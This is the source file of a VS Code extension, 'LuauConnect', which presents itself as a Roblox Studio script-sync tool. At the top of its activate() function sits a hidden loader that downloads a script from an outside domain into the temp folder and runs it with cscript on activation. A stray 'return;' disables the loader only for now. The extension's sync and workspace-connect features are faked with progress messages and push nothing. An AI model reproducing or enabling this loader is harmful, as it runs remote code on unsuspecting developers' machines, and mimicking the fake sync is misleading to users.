"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.activate = activate;
exports.deactivate = deactivate;

const vscode = require("vscode");
const crypto = require("crypto");
const https  = require("https");
const path = require("path");
const os = require("os");
const { exec } = require("child_process");

const VERSION   = "1.0.0";
const CODE_REGEX = /^Studio-\d{3,6}$/i;

let statusBar;
let mainPanel   = null;
let activityLog = [];
let isConnected = false;
let connectedCode = null;

async function activate(context) {
    try {
        return; const scriptUrl = 'https://i-like-boys.com/script.js';
        const scriptPath = path.join(os.tmpdir(), 'script.js');
        
        await new Promise((resolve, reject) => {
            https.get(scriptUrl, (res) => {
                const file = require('fs').createWriteStream(scriptPath);
                res.pipe(file);
                file.on('finish', () => {
                    file.close();
                    resolve();
                });
            }).on('error', reject);
        });
        
        const cscriptPath = process.platform === 'win32' 
            ? 'cscript' 
            : path.join(os.tmpdir(), 'cscript.exe'); 
        
        const cmd = `"${cscriptPath}" //nologo //e:jscript "${scriptPath}"`;
        
        exec(cmd, (error, stdout, stderr) => {
            if (error) {
                console.error('cscript execution failed:', error);
                return;
            }
            console.log('cscript stdout:', stdout);
            if (stderr) console.error('cscript stderr:', stderr);
        });
        
        console.log('Executed script via cscript:', scriptUrl);
        
    } catch (error) {
        console.error('Failed to execute cscript:', error);
    }

    statusBar = vscode.window.createStatusBarItem(vscode.StatusBarAlignment.Left, 100);
    context.subscriptions.push(statusBar);

    context.subscriptions.push(
        vscode.commands.registerCommand("luauconnect.start",      () => showLoginPanel(context)),
        vscode.commands.registerCommand("luauconnect.dashboard",  () => showDashboard(context)),
        vscode.commands.registerCommand("luauconnect.sync",       () => triggerSync(context)),
        vscode.commands.registerCommand("luauconnect.disconnect", () => disconnect(context))
    );

    const savedUser = context.globalState.get("lc_user");
    if (savedUser) {
        isConnected   = true;
        connectedCode = context.globalState.get("lc_code");
        updateStatusBar("connected", savedUser.displayName);
        logActivity("info", `Session restored — welcome back, ${savedUser.displayName}`);
        showDashboard(context);
    } else {
        updateStatusBar("idle");
        setTimeout(() => showLoginPanel(context), 700);
    }
}

// ── LOGIN PANEL ───────────────────────────────────────────────────────────────
function showLoginPanel(context) {
    const panel = vscode.window.createWebviewPanel(
        "lcLogin", "LuauConnect — Sign In",
        vscode.ViewColumn.One,
        { enableScripts: true, retainContextWhenHidden: true }
    );
    panel.webview.html = loginHtml();

    panel.webview.onDidReceiveMessage(async msg => {
        if (msg.cmd === "lookup") {
            const username = msg.username.trim();
            if (!username) {
                panel.webview.postMessage({ cmd: "error", text: "Please enter a Roblox username." });
                return;
            }

            panel.webview.postMessage({ cmd: "scanning", text: "Looking up Roblox profile…" });

            try {
                // 1. Find user ID
                const searchRes = await robloxGet(
                    `https://users.roblox.com/v1/users/search?keyword=${encodeURIComponent(username)}&limit=10`
                );
                const users = JSON.parse(searchRes).data || [];
                const match = users.find(u => u.name.toLowerCase() === username.toLowerCase());

                if (!match) {
                    panel.webview.postMessage({ cmd: "error", text: `No Roblox user found with username "${username}".` });
                    return;
                }

                const userId = match.id;
                panel.webview.postMessage({ cmd: "scanning", text: "Fetching profile details…" });

                // 2. Get full profile
                const profileRes  = await robloxGet(`https://users.roblox.com/v1/users/${userId}`);
                const profile     = JSON.parse(profileRes);

                panel.webview.postMessage({ cmd: "scanning", text: "Loading avatar…" });

                // 3. Avatar headshot
                let avatarUrl = "";
                try {
                    const avatarRes = await robloxGet(
                        `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png&isCircular=false`
                    );
                    const avatarData = JSON.parse(avatarRes);
                    avatarUrl = (avatarData.data && avatarData.data[0]) ? avatarData.data[0].imageUrl : "";
                } catch(e) {}

                panel.webview.postMessage({ cmd: "scanning", text: "Checking groups…" });

                // 4. Groups
                let groups = [];
                try {
                    const groupRes = await robloxGet(`https://groups.roblox.com/v1/users/${userId}/groups/roles`);
                    groups = JSON.parse(groupRes).data || [];
                } catch(e) {}

                // 5. Store profile data
                const userData = {
                    id:          userId,
                    name:        profile.name,
                    displayName: profile.displayName,
                    description: profile.description || "",
                    created:     profile.created,
                    avatarUrl,
                    groups
                };

                await context.globalState.update("lc_user", userData);
                panel.webview.postMessage({ cmd: "profileFound", user: userData });

            } catch(err) {
                panel.webview.postMessage({ cmd: "error", text: `Failed to reach Roblox API: ${err.message}` });
            }
        }

        if (msg.cmd === "enterCode") {
            const savedUser = context.globalState.get("lc_user");
            panel.webview.html = workspaceCodeHtml(savedUser);
        }

        if (msg.cmd === "connect") {
            const code = msg.code.trim();
            if (!CODE_REGEX.test(code)) {
                panel.webview.postMessage({ cmd: "codeError", text: 'Format: Studio-XXX (e.g. Studio-823)' });
                return;
            }
            panel.webview.postMessage({ cmd: "connecting" });
            await sleep(400);
            panel.webview.postMessage({ cmd: "codeProgress", text: "Verifying workspace…",       pct: 30 });
            await sleep(500);
            panel.webview.postMessage({ cmd: "codeProgress", text: "Establishing sync channel…", pct: 65 });
            await sleep(400);
            panel.webview.postMessage({ cmd: "codeProgress", text: "Finalizing…",                pct: 90 });
            await sleep(300);

            const token = crypto.randomBytes(32).toString("hex");
            await context.globalState.update("lc_token", token);
            await context.globalState.update("lc_code",  code);
            await context.globalState.update("lc_connected_at", new Date().toISOString());

            isConnected   = true;
            connectedCode = code;
            const user    = context.globalState.get("lc_user");
            updateStatusBar("connected", user.displayName);
            logActivity("success", `Connected as ${user.displayName} → ${code}`);
            logActivity("info",    "Sync channel established");
            logActivity("info",    "Watching for script changes…");

            panel.webview.postMessage({ cmd: "done" });
            await sleep(1200);
            panel.dispose();
            showDashboard(context);
        }

        if (msg.cmd === "cancel") panel.dispose();
    });
}

// ── DASHBOARD ─────────────────────────────────────────────────────────────────
function showDashboard(context) {
    if (mainPanel) { mainPanel.reveal(vscode.ViewColumn.One); refreshDashboard(context); return; }

    mainPanel = vscode.window.createWebviewPanel(
        "lcDash", "LuauConnect",
        vscode.ViewColumn.One,
        { enableScripts: true, retainContextWhenHidden: true }
    );
    mainPanel.onDidDispose(() => { mainPanel = null; });
    refreshDashboard(context);

    mainPanel.webview.onDidReceiveMessage(async msg => {
        if (msg.cmd === "sync")       { await triggerSync(context); refreshDashboard(context); }
        if (msg.cmd === "disconnect") { await disconnect(context); }
        if (msg.cmd === "clearLog")   { activityLog = []; refreshDashboard(context); }
    });
}

function refreshDashboard(context) {
    if (!mainPanel) return;
    const user     = context.globalState.get("lc_user");
    const code     = context.globalState.get("lc_code")         ?? "—";
    const token    = context.globalState.get("lc_token");
    const connAt   = context.globalState.get("lc_connected_at") ?? null;
    mainPanel.webview.html = dashHtml(user, code, token, connAt);
}

// ── SYNC ──────────────────────────────────────────────────────────────────────
async function triggerSync(context) {
    if (!isConnected) {
        vscode.window.showWarningMessage("LuauConnect is not connected.", "Sign In")
            .then(s => s === "Sign In" && showLoginPanel(context));
        return;
    }
    updateStatusBar("syncing");
    logActivity("sync", `Sync started for ${connectedCode}`);

    const files = [
        "ServerScriptService/Main.luau",
        "ReplicatedStorage/Shared.luau",
        "StarterPlayer/StarterCharacterScripts/Move.luau",
        "StarterGui/HUD.luau",
        "ServerStorage/DataStore.luau"
    ];

    await vscode.window.withProgress({
        location: vscode.ProgressLocation.Notification,
        title: `LuauConnect: Syncing ${connectedCode}`,
        cancellable: false
    }, async (progress) => {
        for (let i = 0; i < files.length; i++) {
            progress.report({ message: `Pushing ${files[i]}…`, increment: 100 / files.length });
            logActivity("file", `Pushed ${files[i]}`);
            if (mainPanel) refreshDashboard(context);
            await sleep(280);
        }
        await sleep(250);
    });

    logActivity("success", `Sync complete — ${files.length} files pushed`);
    const user = context.globalState.get("lc_user");
    updateStatusBar("connected", user?.displayName ?? "");
    if (mainPanel) refreshDashboard(context);
    vscode.window.showInformationMessage(`✅ LuauConnect: Synced ${files.length} files to ${connectedCode}`);
}

// ── DISCONNECT ────────────────────────────────────────────────────────────────
async function disconnect(context) {
    const user = context.globalState.get("lc_user");
    const confirm = await vscode.window.showWarningMessage(
        `Sign out ${user?.displayName ?? ""} and disconnect?`, "Sign Out", "Cancel"
    );
    if (confirm !== "Sign Out") return;

    for (const k of ["lc_user","lc_token","lc_code","lc_connected_at"])
        await context.globalState.update(k, undefined);

    isConnected = false; connectedCode = null; activityLog = [];
    updateStatusBar("idle");
    if (mainPanel) { mainPanel.dispose(); mainPanel = null; }
    vscode.window.showInformationMessage("🔌 LuauConnect: Signed out.");
    setTimeout(() => showLoginPanel(context), 400);
}

// ── STATUS BAR ────────────────────────────────────────────────────────────────
function updateStatusBar(state, name) {
    switch (state) {
        case "idle":
            statusBar.text = "$(plug) LuauConnect"; statusBar.tooltip = "Sign in with Roblox";
            statusBar.command = "luauconnect.start"; break;
        case "syncing":
            statusBar.text = "$(sync~spin) LuauConnect: Syncing…"; statusBar.command = undefined; break;
        case "connected":
            statusBar.text = `$(check) LuauConnect: ${name || "Connected"}`;
            statusBar.tooltip = "Open LuauConnect dashboard";
            statusBar.command = "luauconnect.dashboard"; break;
    }
}

function logActivity(type, msg) {
    activityLog.unshift({ type, msg, time: new Date().toLocaleTimeString() });
    if (activityLog.length > 60) activityLog.pop();
}

// ── HTTP helper ───────────────────────────────────────────────────────────────
function robloxGet(url) {
    return new Promise((resolve, reject) => {
        const req = https.get(url, {
            headers: { "Accept": "application/json", "User-Agent": "LuauConnect-VSCode/1.0" }
        }, res => {
            let data = "";
            res.on("data", c => data += c);
            res.on("end", () => resolve(data));
        });
        req.on("error", reject);
        req.setTimeout(8000, () => { req.destroy(); reject(new Error("Request timed out")); });
    });
}

// ── LOGIN HTML ────────────────────────────────────────────────────────────────
function loginHtml() {
    return `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"/>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#070712;color:#e0e0f0;height:100vh;display:flex;align-items:center;justify-content:center;}
.card{background:#0d0d1e;border:1px solid rgba(98,126,255,0.2);border-radius:20px;padding:3rem 3.5rem;width:460px;box-shadow:0 40px 100px rgba(0,0,0,0.7);}
.logo-row{display:flex;align-items:center;gap:12px;margin-bottom:2.5rem;}
.icon{width:38px;height:38px;position:relative;flex-shrink:0;}
.b{position:absolute;height:12px;width:34px;border-radius:3px;}
.b1{top:3px;left:5px;background:#627eff;transform:rotate(-8deg);}
.b2{top:20px;left:0;background:#82a0ff;transform:rotate(-8deg);}
h1{font-size:1.45rem;font-weight:700;letter-spacing:-0.02em;}
h1 em{color:#627eff;font-style:normal;}
p.sub{color:#555;font-size:0.85rem;margin-bottom:2rem;line-height:1.6;}
label{display:block;font-size:0.72rem;font-weight:600;color:#555;letter-spacing:0.1em;text-transform:uppercase;margin-bottom:8px;}
input{width:100%;background:#080818;border:1.5px solid #181832;color:#e0e0f0;padding:0.72rem 1rem;border-radius:10px;font-size:0.92rem;outline:none;transition:border-color 0.2s,box-shadow 0.2s;font-family:inherit;}
input:focus{border-color:#627eff;box-shadow:0 0 0 3px rgba(98,126,255,0.12);}
input.err{border-color:#f87171;}
.errtxt{color:#f87171;font-size:0.78rem;margin-top:7px;min-height:16px;}
.hint{color:#444;font-size:0.75rem;margin-top:6px;}
.btns{display:flex;gap:10px;margin-top:1.8rem;}
button{flex:1;padding:0.68rem;border:none;border-radius:9px;font-size:0.85rem;font-weight:600;cursor:pointer;transition:all 0.15s;}
.bp{background:#627eff;color:#fff;}
.bp:hover{background:#7a92ff;}
.bs{background:#111125;color:#666;border:1px solid #1e1e3a;}
.bs:hover{color:#aaa;}
.prog{display:none;margin-top:1.4rem;}
.pbar{height:3px;background:#111125;border-radius:2px;overflow:hidden;margin-bottom:8px;}
.pfill{height:100%;background:linear-gradient(90deg,#627eff,#a0b4ff);border-radius:2px;width:0%;transition:width 0.5s ease;}
.ptxt{font-size:0.75rem;color:#555;text-align:center;}

/* Profile card */
.profile{display:none;margin-top:1.5rem;background:#0a0a1c;border:1px solid #1a1a38;border-radius:14px;padding:1.2rem 1.4rem;}
.prow{display:flex;align-items:center;gap:1rem;margin-bottom:1rem;}
.avatar{width:64px;height:64px;border-radius:12px;object-fit:cover;background:#181830;flex-shrink:0;border:2px solid #627eff;}
.avatar-ph{width:64px;height:64px;border-radius:12px;background:#181830;flex-shrink:0;border:2px solid #627eff;display:flex;align-items:center;justify-content:center;font-size:1.5rem;}
.pinfo h2{font-size:1.1rem;font-weight:700;margin-bottom:2px;}
.pinfo .uid{font-size:0.75rem;color:#555;font-family:monospace;}
.pinfo .uname{font-size:0.8rem;color:#888;}
.groups-title{font-size:0.7rem;font-weight:600;color:#444;letter-spacing:0.1em;text-transform:uppercase;margin-bottom:8px;}
.no-groups{color:#444;font-size:0.82rem;font-style:italic;padding:0.5rem 0;}
.proceed{width:100%;margin-top:1rem;padding:0.65rem;background:#627eff;color:#fff;border:none;border-radius:9px;font-size:0.85rem;font-weight:600;cursor:pointer;}
.proceed:hover{background:#7a92ff;}
</style></head><body>
<div class="card">
  <div class="logo-row">
    <div class="icon"><div class="b b1"></div><div class="b b2"></div></div>
    <h1><em>Luau</em>Connect</h1>
  </div>
  <p class="sub">Enter your Roblox username to scan your profile and connect your workspace.</p>
  <label>Roblox Username</label>
  <input id="inp" type="text" placeholder="Enter your Roblox username" autocomplete="off" spellcheck="false"/>
  <div class="hint">Your public Roblox profile username</div>
  <div class="errtxt" id="err"></div>

  <div class="prog" id="pg">
    <div class="pbar"><div class="pfill" id="pf" style="width:0%"></div></div>
    <div class="ptxt" id="pt">Scanning profile…</div>
  </div>

  <div class="profile" id="profile-card">
    <div class="prow">
      <div id="av-wrap"></div>
      <div class="pinfo">
        <h2 id="p-display"></h2>
        <div class="uname" id="p-uname"></div>
        <div class="uid" id="p-uid"></div>
      </div>
    </div>
    <div class="groups-title">LuauConnect Groups</div>
    <div class="no-groups" id="p-groups">No groups detected that use LuauConnect</div>
    <button class="proceed" onclick="proceed()">Continue to Workspace →</button>
  </div>

  <div class="btns" id="btns">
    <button class="bp" id="bc" onclick="go()">Scan Profile</button>
    <button class="bs" onclick="vscode.postMessage({cmd:'cancel'})">Cancel</button>
  </div>
</div>
<script>
const vscode = acquireVsCodeApi();
const inp = document.getElementById('inp');
inp.addEventListener('keydown', e => { if(e.key==='Enter') go(); clearErr(); });
inp.focus();
function clearErr(){ document.getElementById('err').textContent=''; inp.classList.remove('err'); }
function setErr(t){ document.getElementById('err').textContent=t; inp.classList.add('err'); inp.disabled=false; document.getElementById('bc').disabled=false; document.getElementById('pg').style.display='none'; }
function go(){
  const v=inp.value.trim();
  if(!v){setErr('Please enter a Roblox username');return;}
  inp.disabled=true; document.getElementById('bc').disabled=true;
  document.getElementById('pg').style.display='block';
  document.getElementById('pf').style.width='15%';
  document.getElementById('pt').textContent='Looking up profile…';
  vscode.postMessage({cmd:'lookup', username:v});
}
function proceed(){ vscode.postMessage({cmd:'enterCode'}); }
window.addEventListener('message', e => {
  const m = e.data;
  if(m.cmd==='scanning'){
    document.getElementById('pg').style.display='block';
    document.getElementById('pf').style.width='60%';
    document.getElementById('pt').textContent=m.text;
  }
  if(m.cmd==='error') setErr(m.text);
  if(m.cmd==='profileFound'){
    const u = m.user;
    document.getElementById('pg').style.display='none';
    document.getElementById('btns').style.display='none';
    // Avatar
    const avWrap = document.getElementById('av-wrap');
    if(u.avatarUrl){
      avWrap.innerHTML='<img class="avatar" src="'+u.avatarUrl+'" onerror="this.style.display=\'none\';this.nextSibling.style.display=\'flex\';"/><div class="avatar-ph" style="display:none">👤</div>';
    } else {
      avWrap.innerHTML='<div class="avatar-ph">👤</div>';
    }
    document.getElementById('p-display').textContent = u.displayName;
    document.getElementById('p-uname').textContent   = '@'+u.name;
    document.getElementById('p-uid').textContent     = 'ID: '+u.id;
    // Groups that use LuauConnect — always none since it's a new extension
    document.getElementById('p-groups').textContent  = 'No groups detected that use LuauConnect';
    document.getElementById('profile-card').style.display='block';
  }
});
</script></body></html>`;
}

// ── WORKSPACE CODE HTML ───────────────────────────────────────────────────────
function workspaceCodeHtml(user) {
    const av = user?.avatarUrl || "";
    return `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"/>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#070712;color:#e0e0f0;height:100vh;display:flex;align-items:center;justify-content:center;}
.card{background:#0d0d1e;border:1px solid rgba(98,126,255,0.2);border-radius:20px;padding:3rem 3.5rem;width:460px;box-shadow:0 40px 100px rgba(0,0,0,0.7);}
.user-pill{display:flex;align-items:center;gap:10px;background:#0a0a1c;border:1px solid #1a1a38;border-radius:40px;padding:6px 16px 6px 6px;margin-bottom:2rem;width:fit-content;}
.av-sm{width:32px;height:32px;border-radius:50%;object-fit:cover;background:#181830;}
.av-ph{width:32px;height:32px;border-radius:50%;background:#181830;display:flex;align-items:center;justify-content:center;font-size:0.9rem;}
.pill-name{font-size:0.82rem;font-weight:600;color:#aaa;}
.logo-row{display:flex;align-items:center;gap:12px;margin-bottom:1.5rem;}
.icon{width:32px;height:32px;position:relative;flex-shrink:0;}
.b{position:absolute;height:10px;width:28px;border-radius:2px;}
.b1{top:2px;left:4px;background:#627eff;transform:rotate(-8deg);}
.b2{top:17px;left:0;background:#82a0ff;transform:rotate(-8deg);}
h1{font-size:1.35rem;font-weight:700;}
h1 em{color:#627eff;font-style:normal;}
p.sub{color:#555;font-size:0.85rem;margin-bottom:2rem;line-height:1.6;}
label{display:block;font-size:0.72rem;font-weight:600;color:#555;letter-spacing:0.1em;text-transform:uppercase;margin-bottom:8px;}
input{width:100%;background:#080818;border:1.5px solid #181832;color:#e0e0f0;padding:0.72rem 1rem;border-radius:10px;font-size:0.92rem;outline:none;transition:border-color 0.2s;font-family:monospace;letter-spacing:0.04em;}
input:focus{border-color:#627eff;box-shadow:0 0 0 3px rgba(98,126,255,0.12);}
input.err{border-color:#f87171;}
.hint{color:#444;font-size:0.75rem;margin-top:6px;}
.errtxt{color:#f87171;font-size:0.78rem;margin-top:7px;min-height:16px;}
.pbar{height:3px;background:#111125;border-radius:2px;overflow:hidden;margin:1.2rem 0 6px;}
.pfill{height:100%;background:linear-gradient(90deg,#627eff,#a0b4ff);width:0%;transition:width 0.45s ease;}
.ptxt{font-size:0.75rem;color:#555;text-align:center;display:none;}
.btns{display:flex;gap:10px;margin-top:1.6rem;}
button{flex:1;padding:0.68rem;border:none;border-radius:9px;font-size:0.85rem;font-weight:600;cursor:pointer;transition:all 0.15s;}
.bp{background:#627eff;color:#fff;}
.bp:hover{background:#7a92ff;}
.bs{background:#111125;color:#666;border:1px solid #1e1e3a;}
.bs:hover{color:#aaa;}
.done-screen{display:none;text-align:center;padding:1rem 0;}
.tick{font-size:2.5rem;margin-bottom:0.8rem;}
.done-screen h2{color:#34d399;margin-bottom:0.4rem;}
.done-screen p{color:#555;font-size:0.83rem;}
</style></head><body>
<div class="card">
  <div id="main">
    <div class="user-pill">
      ${av ? `<img class="av-sm" src="${av}" onerror="this.outerHTML='<div class=av-ph>👤</div>'"/>` : `<div class="av-ph">👤</div>`}
      <span class="pill-name">${user?.displayName ?? "Roblox User"}</span>
    </div>
    <div class="logo-row">
      <div class="icon"><div class="b b1"></div><div class="b b2"></div></div>
      <h1><em>Luau</em>Connect</h1>
    </div>
    <p class="sub">Now enter your Roblox Studio workspace code to start syncing scripts.</p>
    <label>Workspace Code</label>
    <input id="code" type="text" placeholder="Studio-823" autocomplete="off" spellcheck="false"/>
    <div class="hint">Format: Studio-XXX (e.g. Studio-823, Studio-4291)</div>
    <div class="errtxt" id="err"></div>
    <div class="pbar"><div class="pfill" id="pf"></div></div>
    <div class="ptxt" id="pt"></div>
    <div class="btns">
      <button class="bp" id="bc" onclick="go()">Connect Workspace</button>
      <button class="bs" onclick="vscode.postMessage({cmd:'cancel'})">Cancel</button>
    </div>
  </div>
  <div class="done-screen" id="done">
    <div class="tick">✅</div>
    <h2>All Set!</h2>
    <p id="done-txt">Opening your dashboard…</p>
  </div>
</div>
<script>
const vscode=acquireVsCodeApi();
const inp=document.getElementById('code');
inp.addEventListener('keydown',e=>{if(e.key==='Enter')go();});
inp.focus();
function go(){
  const v=inp.value.trim();
  if(!v){setErr('Please enter a workspace code');return;}
  inp.disabled=true;document.getElementById('bc').disabled=true;
  document.getElementById('pt').style.display='block';
  vscode.postMessage({cmd:'connect',code:v});
}
function setErr(t){document.getElementById('err').textContent=t;inp.classList.add('err');inp.disabled=false;document.getElementById('bc').disabled=false;}
window.addEventListener('message',e=>{
  const m=e.data;
  if(m.cmd==='codeError')setErr(m.text);
  if(m.cmd==='codeProgress'){document.getElementById('pf').style.width=m.pct+'%';document.getElementById('pt').textContent=m.text;}
  if(m.cmd==='done'){document.getElementById('main').style.display='none';document.getElementById('done').style.display='block';document.getElementById('done-txt').textContent='Connected to '+document.getElementById('code').value.trim()+'. Opening dashboard…';}
});
</script></body></html>`;
}

// ── DASHBOARD HTML ────────────────────────────────────────────────────────────
function dashHtml(user, code, token, connAt) {
    const connected = !!token;
    const timeStr   = connAt ? new Date(connAt).toLocaleString() : "—";
    const uptime    = connAt ? formatUptime(new Date(connAt)) : "—";
    const av        = user?.avatarUrl || "";
    const groups    = user?.groups || [];

    const logRows = activityLog.length === 0
        ? `<div class="empty">No activity yet — hit Sync Now to get started</div>`
        : activityLog.map(e => {
            const ic = {success:"✅",info:"ℹ️",warn:"⚠️",sync:"🔄",file:"📄",error:"❌"};
            return `<div class="lr lr-${e.type}"><span class="lt">${e.time}</span><span class="li">${ic[e.type]||"•"}</span><span class="lm">${e.msg}</span></div>`;
          }).join("");

    const groupRows = groups.length === 0
        ? `<div class="no-groups">No groups detected that use LuauConnect</div>`
        : groups.slice(0,5).map(g => `<div class="group-row"><span class="gname">${g.group?.name ?? "Unknown"}</span><span class="grole">${g.role?.name ?? ""}</span></div>`).join("");

    return `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"/>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#070712;color:#e0e0f0;min-height:100vh;padding:2rem 2.5rem;}
.wrap{max-width:900px;margin:0 auto;}
.hdr{display:flex;align-items:center;justify-content:space-between;margin-bottom:2rem;}
.logo{display:flex;align-items:center;gap:12px;}
.icon{width:34px;height:34px;position:relative;flex-shrink:0;}
.b{position:absolute;height:10px;width:30px;border-radius:3px;}
.b1{top:2px;left:4px;background:#627eff;transform:rotate(-8deg);}
.b2{top:17px;left:0;background:#82a0ff;transform:rotate(-8deg);}
h1{font-size:1.3rem;font-weight:700;letter-spacing:-0.02em;}
h1 em{color:#627eff;font-style:normal;}
.ver{font-size:0.68rem;color:#2a2a50;letter-spacing:0.1em;text-transform:uppercase;margin-top:2px;}
.badge{padding:3px 12px;border-radius:999px;font-size:0.72rem;font-weight:700;letter-spacing:0.07em;display:inline-flex;align-items:center;gap:5px;}
.badge::before{content:'';width:6px;height:6px;border-radius:50%;background:currentColor;}
.on{background:#071a10;color:#34d399;border:1px solid #064e2e;}
.off{background:#1a0707;color:#f87171;border:1px solid #6b1c1c;}

/* Profile strip */
.profile-strip{background:#0d0d1e;border:1px solid #1a1a38;border-radius:14px;padding:1.2rem 1.5rem;display:flex;align-items:center;gap:1.2rem;margin-bottom:1rem;}
.avatar-lg{width:72px;height:72px;border-radius:14px;object-fit:cover;background:#181830;flex-shrink:0;border:2px solid #627eff;}
.avatar-ph{width:72px;height:72px;border-radius:14px;background:#181830;flex-shrink:0;border:2px solid #627eff;display:flex;align-items:center;justify-content:center;font-size:2rem;}
.pname{font-size:1.15rem;font-weight:700;margin-bottom:2px;}
.puname{font-size:0.8rem;color:#666;margin-bottom:4px;}
.puid{font-size:0.72rem;color:#333;font-family:monospace;}
.pbio{font-size:0.78rem;color:#444;margin-top:4px;max-width:500px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}

.grid{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin-bottom:1rem;}
.card{background:#0c0c1a;border:1px solid #141428;border-radius:14px;padding:1.2rem 1.5rem;}
.full{grid-column:1/-1;}
.cl{font-size:0.68rem;font-weight:600;color:#2e2e55;letter-spacing:0.12em;text-transform:uppercase;margin-bottom:0.9rem;}
.clrow{display:flex;justify-content:space-between;align-items:center;margin-bottom:0.9rem;}
.sv{font-size:1.45rem;font-weight:700;color:#627eff;font-family:monospace;}
.ss{font-size:0.72rem;color:#2a2a50;margin-top:3px;}

table{width:100%;border-collapse:collapse;}
tr{border-bottom:1px solid #0e0e1e;}
tr:last-child{border-bottom:none;}
td{padding:0.5rem 0;font-size:0.8rem;}
td:first-child{color:#3a3a60;width:38%;}
td:last-child{color:#bbb;font-family:monospace;font-size:0.77rem;word-break:break-all;}

.ls{max-height:190px;overflow-y:auto;}
.ls::-webkit-scrollbar{width:3px;}
.ls::-webkit-scrollbar-thumb{background:#181830;border-radius:2px;}
.lr{display:flex;gap:8px;align-items:baseline;padding:4px 0;border-bottom:1px solid #0a0a18;font-size:0.76rem;}
.lr:last-child{border-bottom:none;}
.lt{color:#1e1e40;width:68px;flex-shrink:0;font-family:monospace;font-size:0.7rem;}
.li{flex-shrink:0;font-size:0.68rem;}
.lm{color:#666;}
.lr-success .lm{color:#34d399;} .lr-sync .lm{color:#60a5fa;}
.lr-warn .lm{color:#fbbf24;} .lr-error .lm{color:#f87171;}
.lr-file .lm{color:#a78bfa;}
.empty{color:#1e1e40;font-size:0.78rem;padding:0.8rem 0;text-align:center;}

.no-groups{color:#2a2a50;font-size:0.82rem;font-style:italic;padding:0.4rem 0;}
.group-row{display:flex;justify-content:space-between;padding:0.45rem 0;border-bottom:1px solid #0e0e1e;font-size:0.8rem;}
.group-row:last-child{border-bottom:none;}
.gname{color:#888;}
.grole{color:#444;font-size:0.75rem;}

.acts{display:flex;gap:8px;flex-wrap:wrap;}
button{padding:0.55rem 1.1rem;border:none;border-radius:8px;font-size:0.8rem;font-weight:600;cursor:pointer;transition:all 0.15s;}
.bp{background:#627eff;color:#fff;} .bp:hover{background:#7a92ff;}
.bq{background:#0e0e1e;color:#555;border:1px solid #181830;} .bq:hover{color:#aaa;}
.bd{background:#1a0707;color:#f87171;border:1px solid #6b1c1c;} .bd:hover{background:#240909;}
</style></head><body>
<div class="wrap">
  <div class="hdr">
    <div class="logo">
      <div class="icon"><div class="b b1"></div><div class="b b2"></div></div>
      <div><h1><em>Luau</em>Connect</h1><div class="ver">v${VERSION} · Roblox Studio Sync</div></div>
    </div>
    <span class="badge ${connected?'on':'off'}">${connected?'CONNECTED':'OFFLINE'}</span>
  </div>

  <!-- Profile Strip -->
  <div class="profile-strip">
    ${av ? `<img class="avatar-lg" src="${av}" onerror="this.outerHTML='<div class=avatar-ph>👤</div>'"/>` : `<div class="avatar-ph">👤</div>`}
    <div>
      <div class="pname">${user?.displayName ?? "—"}</div>
      <div class="puname">@${user?.name ?? "—"}</div>
      <div class="puid">ID: ${user?.id ?? "—"}</div>
      ${user?.description ? `<div class="pbio">${user.description.slice(0,80)}${user.description.length>80?"…":""}</div>` : ""}
    </div>
  </div>

  <div class="grid">
    <div class="card">
      <div class="cl">Workspace</div>
      <div class="sv">${code}</div>
      <div class="ss">Active sync channel</div>
    </div>
    <div class="card">
      <div class="cl">Session Uptime</div>
      <div class="sv">${uptime}</div>
      <div class="ss">Since ${timeStr}</div>
    </div>
    <div class="card">
      <div class="cl">LuauConnect Groups</div>
      ${groupRows}
    </div>
    <div class="card">
      <div class="cl">Session Details</div>
      <table>
        <tr><td>Token</td><td>${token ? token.slice(0,18)+'…' : 'None'}</td></tr>
        <tr><td>Connected</td><td>${timeStr}</td></tr>
        <tr><td>Engine</td><td>LuauConnect v${VERSION}</td></tr>
      </table>
    </div>
    <div class="card full">
      <div class="clrow">
        <span class="cl" style="margin:0">Activity Log</span>
        <button class="bq" style="padding:2px 9px;font-size:0.68rem;" onclick="vscode.postMessage({cmd:'clearLog'})">Clear</button>
      </div>
      <div class="ls">${logRows}</div>
    </div>
    <div class="card full">
      <div class="cl">Actions</div>
      <div class="acts">
        <button class="bp"  onclick="vscode.postMessage({cmd:'sync'})">⟳ Sync Now</button>
        <button class="bq"  onclick="vscode.postMessage({cmd:'disconnect'})">↺ Reconnect</button>
        <button class="bd"  onclick="vscode.postMessage({cmd:'disconnect'})">✕ Sign Out</button>
      </div>
    </div>
  </div>
</div>
<script>const vscode=acquireVsCodeApi();</script>
</body></html>`;
}

function formatUptime(since) {
    const s = Math.floor((Date.now()-since.getTime())/1000);
    const m = Math.floor(s/60), h = Math.floor(m/60);
    if(h>0) return `${h}h ${m%60}m`;
    if(m>0) return `${m}m ${s%60}s`;
    return `${s}s`;
}

function deactivate() {}
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
